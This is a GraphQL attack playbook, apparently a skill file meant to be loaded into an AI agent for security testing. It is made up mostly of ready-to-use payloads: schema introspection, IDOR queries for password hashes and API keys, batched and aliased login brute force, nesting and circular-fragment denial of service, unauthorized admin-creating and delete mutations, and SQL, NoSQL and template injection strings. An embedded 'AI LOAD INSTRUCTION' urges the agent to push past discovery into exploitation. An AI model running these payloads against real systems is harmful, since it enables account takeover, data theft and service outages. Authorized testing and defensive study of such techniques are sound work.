---
name: graphql-and-hidden-parameters
description: >-
  GraphQL and hidden parameter testing playbook. Use when exploring introspection,
  batching, undocumented fields, hidden parameters, schema abuse, query depth DoS,
  mutation authorization gaps, subscription abuse, and injection via GraphQL resolvers.
---

# SKILL: GraphQL and Hidden Parameters — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: GraphQL security testing covers schema discovery via introspection, batching abuse for rate limit bypass, hidden/undocumented field extraction, authorization gaps in nested queries, mutation abuse, subscription WebSocket hijacking, and injection through resolver arguments. Base models often stop at introspection — this skill pushes through to exploitation.

## QUICK START

### First-pass probes

| Situation | Probe | Why |
|---|---|---|
| Confirm GraphQL | `{__typename}` | Universal GraphQL fingerprint |
| Schema discovery | `__schema { types { name } }` | Full introspection |
| Field suggestions | Send typo in field name | Error may suggest valid fields |
| Batching abuse | `[{query1}, {query2}, ...]` | Array of queries bypasses rate limits |
| Hidden fields | Add `debug`, `admin`, `internal` to types | Undocumented fields |
| Injection test | `"1' OR '1'='1"` in arguments | Resolver may pass to SQL/NoSQL |

### First-pass probe set

```graphql
{__typename}
{__schema { types { name fields { name } } }}
{__type(name: "User") { fields { name type { name } } }}
mutation { __typename }
subscription { __typename }
```

---

## 1. INTROSPECTION AND SCHEMA DISCOVERY

### Full Introspection Query

```graphql
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
          ofType { name kind }
        }
        args {
          name
          type { name kind }
        }
      }
    }
    queryType { name }
    mutationType { name }
    subscriptionType { name }
  }
}
```

### When Introspection is Disabled

- **Field suggestions**: Send `{usr}` → error may respond `"Did you mean \"user\"?"`
- **Error-based discovery**: `{__type(name: "User") { name }}` may still work
- **JS bundle mining**: Extract field names from frontend JavaScript bundles
- **Mobile APK/IPA**: Decompile and search for GraphQL field names
- **Known type probes**: Try common types (`User`, `Post`, `Admin`, `Config`, `Token`)

### Apollo Studio / GraphiQL Exposure

```
/graphql?explore=1
/altair
/graphiql
/graphql/console
/playground
```

---

## 2. AUTHORIZATION GAPS

### IDOR via GraphQL

```graphql
# Normal user query:
query { user(id: 1) { name email } }
# Try accessing other users:
query { user(id: 2) { name email passwordHash role } }

# Nested authorization gaps:
query {
  user(id: 1) {
    posts {
      comments {
        author { email role }  # May bypass object-level auth
      }
    }
  }
}
```

### Field-Level Access Control Bypass

```graphql
# Public fields: name, avatar
# Hidden fields: email, role, apiKey, ssn
query { user(id: 1) { name email role apiKey ssn } }
# If field-level auth is missing, all fields returned
```

### Mutation Authorization

```graphql
# Try admin mutations as regular user:
mutation { updateUserRole(id: 2, role: "admin") { success } }
mutation { deleteUser(id: 3) { success } }
mutation { updateConfig(key: "debug", value: "true") { success } }
```

---

## 3. BATCHING AND RATE LIMIT BYPASS

### Query Batching

```json
[
  {"query": "mutation { login(email: \"victim@x.com\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(email: \"victim@x.com\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(email: \"victim@x.com\", password: \"pass3\") { token } }"}
]
// All queries execute in single request → bypasses rate limiting
```

### Alias Abuse

```graphql
query {
  a: login(email: "admin@test.com", password: "password1") { token }
  b: login(email: "admin@test.com", password: "password2") { token }
  c: login(email: "admin@test.com", password: "password3") { token }
  # ... repeat 1000 times in single query
}
```

---

## 4. QUERY DEPTH AND COMPLEXITY

### Deep Nesting DoS

```graphql
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends { name }  # 6 levels deep, exponential data
            }
          }
        }
      }
    }
  }
}
```

### Circular Fragment DoS

```graphql
query {
  ...frag
}
fragment frag on User {
  friends { ...frag }
}
# If no depth limit, causes infinite recursion → server CPU exhaustion
```

---

## 5. MUTATION ABUSE

### Create Without Authorization

```graphql
mutation {
  createUser(email: "attacker@evil.com", password: "pwned", role: "admin") {
    id email role
  }
}
```

### Update Other Users' Data

```graphql
mutation {
  updateUser(id: 2, email: "attacker@evil.com") {
    success
  }
}
# Try modifying other users' profiles, roles, settings
```

### Delete Operations

```graphql
mutation { deletePost(id: 1) { success } }
mutation { deleteAllPosts { count } }
mutation { deleteUser(id: 3) { success } }
```

---

## 6. SUBSCRIPTION ABUSE

### WebSocket Connection Hijacking

```graphql
subscription {
  newMessage(roomId: "admin-room") {
    content
    author { name role }
  }
}
# If room authorization is missing, read any room's messages
```

### Data Exfiltration via Subscriptions

```graphql
subscription {
  userUpdated {
    email
    passwordHash
    role
  }
}
# Real-time stream of sensitive field updates
```

---

## 7. HIDDEN PARAMETER DISCOVERY

### Undocumented Fields

- Check `additionalProperties` in API schemas
- Frontend code may use richer request bodies than visible UI controls
- Mobile endpoints often carry `role`, `org`, `featureFlag`, `internalFilter` fields
- Admin documentation may list fields not in public docs

### Debug/Internal Fields

```graphql
query {
  user(id: 1) {
    name
    email
    __debug    # Internal debugging fields
    _internal
    debug
    admin
    raw
    source
  }
}
```

### Deprecated Fields

```graphql
# Check for @deprecated directive but still functional:
{__type(name: "User") { fields { name isDeprecated deprecationReason } }}
```

---

## 8. INJECTION VIA GRAPHQL

### SQL Injection in Resolvers

```graphql
query {
  user(id: "1' OR '1'='1") { name email }
  search(text: "' UNION SELECT password FROM users--") { results }
}
```

### NoSQL Injection in Filters

```graphql
query {
  users(filter: "{\"$gt\": \"\"}") { name email }
  search(query: {"$where": "sleep(5000)"}) { results }
}
```

### SSTI in Query Arguments

```graphql
query {
  render(template: "{{7*7}}") { output }
  search(template: "${7*7}") { results }
}
```

---

## DECISION TREE

```
Found GraphQL endpoint?
├── Introspection enabled?
│   ├── YES → Extract full schema, enumerate all types/fields/mutations
│   └── NO → Field suggestions, JS bundle mining, known type probes
│
├── Authorization gaps?
│   ├── Test IDOR: query other users' data by ID
│   ├── Test field-level: request admin/internal fields
│   └── Test mutations: create/update/delete without proper role
│
├── Rate limiting?
│   ├── Query batching: array of queries in single request
│   └── Alias abuse: repeated operations via aliases
│
├── Injection surface?
│   ├── SQL injection in resolver arguments
│   ├── NoSQL injection in filter inputs
│   └── SSTI in template arguments
│
└── DoS potential?
    ├── Deep nesting (exponential data)
    └── Circular fragments (infinite recursion)
```

---

## TESTING CHECKLIST

- [ ] Confirm GraphQL endpoint and fingerprint implementation
- [ ] Run full introspection query (or partial if disabled)
- [ ] Enumerate all query types, mutations, subscriptions
- [ ] Test IDOR: access other users' data via ID arguments
- [ ] Test field-level access: request hidden/admin/internal fields
- [ ] Test mutation authorization: create/update/delete as low-priv user
- [ ] Test query batching for rate limit bypass
- [ ] Test alias abuse for brute-force amplification
- [ ] Test query depth limits (deep nesting DoS)
- [ ] Test injection in resolver arguments (SQLi, NoSQL, SSTI)
- [ ] Check for hidden/deprecated fields via schema introspection
- [ ] Check for debug/internal field exposure

---

## TARGET TOOL ADAPTATION

Use visible `graphql-scanner`, `api-schema-analyzer`, `http-framework-test`, `x8`, `ffuf`, or `execute-python-script` tools for schema inspection, controlled query replay and argument mutation. Inspect downloaded frontend assets with visible file/command tools when needed. Never assume a browser-agent or repeater MCP exists.

---

## RELATED ROUTING

- If hidden fields affect privilege: [IDOR and Broken Object Authorization](../idor-broken-object-authorization/SKILL.md)
- If GraphQL batching changes auth or rate behavior: [JWT and OAuth Token Attacks](../jwt-oauth-token-attacks/SKILL.md)
- If endpoint discovery is incomplete: [API Security Router](../api-sec/SKILL.md)
- If NoSQL injection found via GraphQL filters: [NoSQL Injection](../nosql-injection/SKILL.md)
- If SQL injection found in resolver: [SQL Injection](../sqli-sql-injection/SKILL.md)
